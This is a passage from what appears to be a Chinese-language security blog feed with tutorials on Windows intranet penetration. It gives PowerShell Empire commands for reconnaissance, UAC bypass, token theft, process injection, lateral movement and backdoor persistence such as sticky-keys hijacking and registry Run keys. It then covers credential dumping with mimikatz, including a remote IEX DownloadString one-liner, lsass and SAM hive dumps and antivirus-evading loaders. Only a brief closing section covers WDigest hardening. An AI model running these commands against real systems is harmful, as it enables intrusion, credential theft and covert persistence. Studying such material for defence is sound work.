situational_awareness/host/computerdetails<br>execute<br></code></pre></td></tr></table></figure><p>6.ARP扫描</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule  situational_awareness/network/arpscan<br><span class="hljs-built_in">set</span> Range 192.168.31.0-192.168.31.254     <span class="hljs-comment">#设置扫描网段</span><br>execute<br></code></pre></td></tr></table></figure><p>7.DNS信息收集</p><p>在内网中，知道所有及其的Hostname和对应的IP地址对分析内网结构至关重要</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/reverse_dns<br>execute<br></code></pre></td></tr></table></figure><p>如果主机有两张网卡，Empire也会显示出来。方便我们寻找边界主机</p><p>8.查找域管登录服务器IP</p><p>在内网渗透中，要想拿到内网中某台机器的域管权限，方法之一就是找到域管登录的机器，然后横向渗透进去。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">该模块就是用来查找域管登录的机器,可以清除的看到那个用户登录了那台主机<br>usemodule  situational_awareness/network/powerview/user_hunter<br></code></pre></td></tr></table></figure><p>9.本地管理组访问模块</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/find_localadmin_access<br></code></pre></td></tr></table></figure><p>10.获取域控制器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/get_domain_controller<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210501123516505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>得知当前域服务器名为DC</p><p>在验证能否访问域服务器DC的“C$’’</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SH">shell <span class="hljs-built_in">dir</span> \\DC\C$<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210430173818881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><ul><li><p>Bypass  UAC</p><p>输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/bypassuac<br>info<br><span class="hljs-built_in">set</span> Listener .....<br>execute<br></code></pre></td></tr></table></figure><p>然后会发现上线了一个新的反弹</p><p>back</p><p>agents</p><p>带星号的即为权限提升成功的agents</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-3pKc9smF-1619775511101)(..&#x2F;typora&#x2F;pic&#x2F;image-20201226224409704.png)]</p></li><li><p>bypassuac_wscript</p><p>这个模块的大概原理是使用c:\Windows\wscript.exe执行payload,即绕过UAC实现管理员权限执行Payload,只适用于系统位Windows 7的目标主机，目前尚没有对应的补丁，部分杀毒软件会有提示。</p><p>输入:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">    usemodule privesc/bypassuac_wscript<br>info<br><span class="hljs-built_in">set</span> Listener .....<br>execute<br></code></pre></td></tr></table></figure><p>带星号表示权限提升成功</p></li></ul><h4 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h4><p>Empire内置了PowerUp的部分工具，用于权限提升，主要有Windows错误系统配置漏洞，Windows Services漏洞，AlwaysInstallElevated漏洞等8种提权方式。<br><img src="https://img-blog.csdnimg.cn/20210430173840884.png" alt="在这里插入图片描述"><br>输入:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/powerup<br></code></pre></td></tr></table></figure><p>1.allchecks</p><p>查找系统中的漏洞，和powerSploit中的Invoke-AllChecks模块一样，该模块可以执行所有脚本检查系统漏洞</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/powerup/allchecks<br>execute<br></code></pre></td></tr></table></figure><p>一般会列出一些提权方法：</p><p>可以尝试bypass  UAC来提权</p><p>接着输入bypassuac   root1(listener 名字)</p><p>星号表示提权成功</p><h4 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h4><p>在域里常会启用组策略首选项来更改本地密码，便于管理和部署映像，其缺点是任何普通域用户都可以从相关域控制器的SYSVOL中读取部署信息。GPP是采用AES 256加密的</p><p>输入以下命令即可查看</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/gpp<br></code></pre></td></tr></table></figure><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><ul><li><h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>在获取服务器权限后，可以使用内置的Mimikatz获取系统密码，执行完毕后输入creds</p><p>命令即可查看Empire列举的密码。</p><p>可以发现有域用户曾在此服务器上登录，此时可以窃取域用户身份，然后进行横向渗透，首先要窃取身份</p><p>使用pth<ID>命令</p><p>这里ID就是creadID号<br><img src="https://img-blog.csdnimg.cn/20210501130010676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><p><img src="https://img-blog.csdnimg.cn/20210501130051939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>可以看到执行完之后显示PID进程为2040</p><p>使用steal_token  PID命令即可窃取该身份</p><p>同样可以输入ps查看是否有域用户的进程</p><p>如果有同样通过   steal_token命令来窃取这个令牌</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">steal_token  PID<br></code></pre></td></tr></table></figure><p>输入  revtoself   命令可以将令牌权限恢复到原来的状态。</p><ul><li><h4 id="会话注入"><a href="#会话注入" class="headerlink" title="会话注入"></a>会话注入</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule management/psinject<br><span class="hljs-built_in">set</span> Listener <br><span class="hljs-built_in">set</span> ProcId             <span class="hljs-comment">#设置进程id</span><br></code></pre></td></tr></table></figure><p>该模块进行进程注入，获取权限。</p><p>设置Listener 和Proc  ID这两个参数运行反弹shell</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20210430173930963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><h4 id="Invoke-PsExec"><a href="#Invoke-PsExec" class="headerlink" title="Invoke-PsExec"></a>Invoke-PsExec</h4></li></ul><p>  缺点：是能被基本的杀毒软件检测并留下日志，而且需要开启admiin$445端口共享</p><p>  优点：是可以直接返回system权限。</p><p>  该模块的前提是已经获得本地管理员权限，甚至域管理员账户，然后以此进一步持续渗透整个内网。</p>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_psexec<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure><p>  [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-EiuWuqes-1619775582049)(..&#x2F;typora&#x2F;pic&#x2F;image-20201227125717808.png)]</p><ul><li><h4 id="Invoke-WMI"><a href="#Invoke-WMI" class="headerlink" title="Invoke -WMI"></a>Invoke -WMI</h4><p>比Ps-Exec安全，所有windows系统都启用了该服务，不会写入日志。极高隐蔽性。如果目标机开启了防火墙WMI将无法连接目标机器。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_wmi<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure></li><li><h4 id="PowerShell-Remoting"><a href="#PowerShell-Remoting" class="headerlink" title="PowerShell Remoting"></a>PowerShell Remoting</h4><p>Powershell Remoting是Powershell 的远程管理功能。开启windows远程管理服务WinRM系统会监听5985端口，该服务默认在windows server2012中是开启的，在windows server 2003&#x2F;2008&#x2F;2008 R2中需要手动启动。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">   usemodule lateral_movement/invoke_paremoting<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure></li></ul><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>  后门最主要的目的就是方便以后再次秘密进入或者控制系统</p><ul><li><h4 id="权限持久性劫持shift后门"><a href="#权限持久性劫持shift后门" class="headerlink" title="权限持久性劫持shift后门"></a>权限持久性劫持shift后门</h4><p>输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_wmi_debugger<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br><span class="hljs-built_in">set</span> TargetBinary  sethc.exe<br>execute<br></code></pre></td></tr></table></figure><p>运行完后再目标主机远程登录窗口按5次shift键即可触发后门。</p><p>sethc.exe可以替换成以下这几项：</p><p>1.Utilman.exe(使用Win+U组合键启动)</p><p>2.osk.exe(屏幕上的键盘：使用win+U启动组合键)</p><p>3.Narrator.exe(启动讲述人：使用win+U启动组合键)</p><p>4.Magnify.exe(放大镜:使用Win+U组合键启动)</p></li><li><h4 id="注册表注入后门"><a href="#注册表注入后门" class="headerlink" title="注册表注入后门"></a>注册表注入后门</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule persistence/userland/registry<br><span class="hljs-built_in">set</span> RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run<br>execute<br></code></pre></td></tr></table></figure><p>当我们登录系统时木马就会运行，服务端反弹成功。</p></li><li><h4 id="计划任务获得系统权限"><a href="#计划任务获得系统权限" class="headerlink" title="计划任务获得系统权限"></a>计划任务获得系统权限</h4><p>到了具体的时间将成功返回一个高权限shell,再实际渗透模块中运行该模块时，杀毒软件会有提示</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule persistence/elevated/schtasks<br><span class="hljs-built_in">set</span> Listener wei<br><span class="hljs-built_in">set</span> DailyTime 15:36<br>execute<br></code></pre></td></tr></table></figure><p>这里如果把 set RegPath改为    set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run</p><p>那么就会再15:36添加一个注册表注入后门。</p></li></ul><h2 id="Empire反弹回Metasploit"><a href="#Empire反弹回Metasploit" class="headerlink" title="Empire反弹回Metasploit"></a>Empire反弹回Metasploit</h2><p>在实际渗透中，当拿到Webshell上传的MSF客户端无法绕过目标主机的杀毒软件时，可以使用Powershell来绕过，也可以执行Empire的payload来绕过，成功之后在使用Empire的模块将其反弹回Metasploit</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule code_execution/invoke_shellcode<br><span class="hljs-built_in">set</span> Lhost                 <span class="hljs-comment">#设置msf所在主机的IP</span><br><span class="hljs-built_in">set</span> Lport                  <span class="hljs-comment">#设置端口</span><br>execute<br></code></pre></td></tr></table></figure><p>在msf上设置监听：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_https<br><span class="hljs-built_in">set</span> lhost                    <span class="hljs-comment">#一般不用管设置</span><br><span class="hljs-built_in">set</span> lport    <span class="hljs-comment">#一般不用管设置</span><br><span class="hljs-built_in">set</span> Shellcode                <span class="hljs-comment">#自定义shellcode注入</span><br>run<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>Empire使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网密码抓取</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h2 id="Hash读取"><a href="#Hash读取" class="headerlink" title="Hash读取"></a>Hash读取</h2><p>在提权成功拿到system权限之后，下一步就应该为内网渗透做准备。其中很重要的一步就是读取设备本地的hash值。工具读取hash的本质都是利用system权限去读取Windows的SAM文件。在Windows2012版本以下，还可以通过工具直接去读取内存里面的明文密码，Windows 2012之后不能再读内存中的明文，只能用mimiakatz等工具读取hash值然后进行破解。</p><p> <strong>一.使用pwdump获取hash</strong><br> pwdump是一款本地hash读取工具，需要系统权限运行，直接在CMD命令窗口运行即可。测试win7、Win03、window08 均可读取hash值：<br> <img src="https://img-blog.csdnimg.cn/20210501163013602.png" alt="在这里插入图片描述"><br>下载地址:<a href="https://www.openwall.com/passwords/windows-pwdump">https://www.openwall.com/passwords/windows-pwdump</a><br><strong>二.使用Getpassowrd</strong><br>打开命令行环境，直接运行工具即可。可获取明文密码。<br><img src="https://img-blog.csdnimg.cn/20210502170711144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载地址：<a href="https://github.com/QAX-A-Team/getpass">https://github.com/QAX-A-Team/getpass</a><br><strong>三.使用mimikatz</strong><br><img src="https://img-blog.csdnimg.cn/202105021711530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Win10或Win 2012 R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，那么可通过修改注册表方式抓取明文，但需要重启电脑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 修改注册表路径,添加一个REG_DWORD类型名为UseLogonCredential设置为1,即可抓取明文</span><br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest<br><br><span class="hljs-comment"># 命令修改注册表方式如下</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure><p>下载地址：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><p> <strong>4.使用Powershell</strong></p><p>或者可以使用Empire的powershell mimikatz<br>powersploit内置有此模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">powershell -<span class="hljs-built_in">exec</span> bypass<br>Import-Module .\Get-PassHashes.PS1<br>Get-PassHashes<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d18b894b6add43709bf3817752c151ca.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>或者powershell版mimikataz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ps1脚本下载</span><br>https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1<br><span class="hljs-comment"># 访问上面链接,会跳转下面链接,所以DownloadString时,使用下面链接,不然会提示“基本连接已关闭等”错误</span><br>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1<br><br><span class="hljs-comment"># powershell抓取,前提保证目标可以访问ps1脚本,否则将脚本放在内网中 (执行速度非常慢)</span><br>powershell.exe IEX (New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;</span>);Invoke-Mimikatz<br></code></pre></td></tr></table></figure><p>这里我本地搞得就不用远程下载得方式了<br><img src="https://img-blog.csdnimg.cn/20210502173737579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>5.使用quarkspwdump</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">输入<br>QuarksPwDump.exe --dump-hash-local<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210502175939817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载地址:<a href="http://code.google.com/p/quarkspwdump/">http://code.google.com/p/quarkspwdump/</a> </p><p><strong>6.使用procdump+mimikatz</strong><br>procdump是微软官网发布得工具，可以在命令行下将目标lsass文件导出，且杀毒软件不会拦截这些操作，导出文件后将文件下载到本地，然后用mimikatz导出密码散列值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//使用procdump导出lsass.dmp文件<br>procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210502180911824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>导出成功，此时当前目录就会增加一个lsass.dmp文件，接下来就用Mimikatz导出密码散列值。<br><img src="https://img-blog.csdnimg.cn/20210502181441542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>7.通过 SAM和System 文件抓取密码</strong><br>无工具导出SAM文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg save hklm\sam sam.hive<br>reg save hklm\system system.hive<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210502182001761.png" alt="在这里插入图片描述"><br>会在当前路径下增加两个文件 sam.hive  和 system.hive<br>使用mimikatz通过sam和system文件获取NTLM Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//将两个文件和Mimikatz放在同一目录下<br>lsadump::sam /sam:sam.hive  /system:system.hive<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210502182520396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>- wce</strong><br>命令：wce.exe -w（抓取明文）、wce.exe –l（抓取hash）</p><ul><li><strong>限制下载文件长度时导出凭据的方法</strong><br>在c#文件中加载mimikatz的方法，实现以下功能：<br>1.获得lsass.exe进程的dmp文件并保存到temp目录<br>2.从dmp文件导出凭据<br>3.删除dmp文件<br>很多实际情况环境对下载文件做了大小限制</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\Windows\Microsoft.NET\Framework64\v3<span class="hljs-number">.5</span>\csc.exe mimikatz.cs /unsafe<br></code></pre></td></tr></table></figure><p>然后直接执行exe<br>mimikatz bypass<br>1.PE to shellcode<br>下载地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pe2shc.exe mimikatz.exe mimi.txt<br>runshc64.exe mimi.txt<br></code></pre></td></tr></table></figure><p>这个方法不太行了<br>2.c#加载mimikatz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cscript mimikatz.js<br></code></pre></td></tr></table></figure><p>3.白名单加载mimikatz<br>使用白名单程序msbuild进行进行加载xml文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\msbuild.exe mimikatz.xml<br></code></pre></td></tr></table></figure><p>4..net4.0加载mimikatz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\MSBuild.exe executes-mimikatz.xmlC:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\MSBuild.exe executes-mimikatz.xml<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a3493e73d4ff4acebb3ba5ea204419c8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>- msf</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">run hashdump<br>hashdump<br>post/windows/gather/credentials/domain_hashdump(获取域<span class="hljs-built_in">hash</span>)<br>use mimikatz<br>wdigest（明文）<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d487f3bdfe4c445f948f000fb51bf2be.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>实战中抓密码大部分都是直接用msf或c2上的工具抓的吧</p><h2 id="单机抓密码防范方法"><a href="#单机抓密码防范方法" class="headerlink" title="单机抓密码防范方法"></a>单机抓密码防范方法</h2><p>  微软为了防止用户密码在内存种以明文形式泄露，发布了补丁KB2871997,关闭了Wdigest功能。<br>windows server 2012 及以上版本默认关闭Wdigest，使攻击者无法从内存种获取明文密码。Windows server 2012及以下的版本，如果安装了KB2871997,攻击者同样无法获取明文密码。<br>        在日常网络维护中，通过查看注册表项Wdigest，可以判断Wdigest功能的状态。如果该项的值为1，用户下次登录时，攻击者就能使用工具获取明文密码。应该确保该项的值为0，使用户明文密码不会出现在内存中。</p><p>在命令行环境中开启或关闭Wdigest Auth,有如下两种方法<br>1.reg add</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在注册表中添加一个键值，将其设置为0，电脑注销后,windows将不会把密码明文存储在内存中</span><br>reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f <br><br><span class="hljs-comment">#在注册表中添加一个键值，将其设置为1，windows会把密码明文存储在内存中</span><br>reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br><br><span class="hljs-comment">#键值是否添加成功</span><br>reg query HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential <span class="hljs-comment">#查询</span><br></code></pre></td></tr></table></figure><p>2.powershell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#开启wdigest Auth</span><br>Set-ItemProperty -Path  HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential -Type DWORD -Value 1<br><br><span class="hljs-comment">#关闭wdigest Auth</span><br>Set-ItemProperty -Path  HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential -Type DWORD -Value 0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>密码抓取</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网隧道隐藏</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/</url>
    
